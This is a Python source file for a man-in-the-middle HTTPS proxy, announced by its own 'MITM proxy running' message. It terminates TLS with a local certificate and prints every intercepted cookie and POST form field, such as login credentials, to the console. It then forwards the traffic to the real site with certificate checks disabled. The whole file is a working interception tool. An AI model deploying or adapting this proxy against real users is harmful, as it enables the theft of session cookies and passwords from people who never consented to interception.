import http.client
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import socketserver
from cgi import parse_header, parse_multipart
from urllib.parse import parse_qs
import http.client, urllib.parse
import gzip
from urllib.parse import urlparse


stop = 1


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        print('[*] GET', self.headers['Host'] + "/" + self.path)
        hs = {}
        for h in self.headers:
            hs[h] = self.headers[h]
        print("\t\tcookie: ", self.headers['Cookie'])
        print("\n")
        ok = 0

        for i in range(10):
            try:
                ctx = ssl._create_default_https_context()
                ctx.check_hostname = False
                conn = http.client.HTTPSConnection(self.headers['Host'], context=ctx, check_hostname=False)
                conn.request("GET", self.path, headers=hs)  # TODO check if headers are working
                r1 = conn.getresponse()

                data1 = r1.read()

                self.send_response(r1.status)
                for h in r1.headers:
                    self.send_header(h, r1.headers[h])
                self.end_headers()

                self.wfile.write(data1)
                return
            except Exception as e:
                print(str(e))
            finally:
                pass
                #self.connection.close()



    def parse_POST(self):
        ctype, pdict = parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            try:
                self.params = self.rfile.read(length)
                d = self.params.decode('ascii')
                postvars = parse_qs(d)
            except Exception as e:
                print(str(e))
                postvars = {}
        else:
            postvars = {}
        return postvars

    def do_POST(self):
        try:
            print("[*] POST " + self.headers['Host'] + " " + self.path)
            tmp = self.parse_POST()
            postvars = {}

            print("\t\tcookie: ", self.headers['Cookie'])
            for v in tmp:
                postvars[v] = tmp[v][0]

            print("\t\tPOST variables:")
            for v in postvars:
                print("\t\t\t", v, ": ", postvars[v])
            print("\n")
            hs = {}
            for h in self.headers:
                hs[h] = self.headers[h]
            conn = http.client.HTTPSConnection(self.headers['Host'])
            conn.request("POST", self.path, self.params, self.headers)  # TODO check if headers are working
            r1 = conn.getresponse()

            data1 = r1.read()  # This will return entire content.

            self.send_response(r1.status)
            for h in r1.headers:
                self.send_header(h, r1.headers[h])
            self.end_headers()
            self.wfile.write(data1)
        except Exception as e:
            print(str(e))
        finally:
            pass
            #self.connection.unwrap()

    def log_message(self, format, *args):
        return


class ForkingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    def finish_request(self, request, client_address):
        request.settimeout(30)
        HTTPServer.finish_request(self, request, client_address)


def start_server(host_ip):
    global stop
    while stop:
        try:
            print("[*] MITM proxy running...")
            httpd = ForkingHTTPServer((host_ip, 4433), MyHandler)
            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True,
                                           cert_reqs=ssl.CERT_OPTIONAL, ssl_version=ssl.PROTOCOL_TLSv1)
            httpd.serve_forever()  # serve_forever
        except Exception as e:
            print(str(e))
        finally:
            httpd.socket.close()
            print("[*] MITM proxy stopped")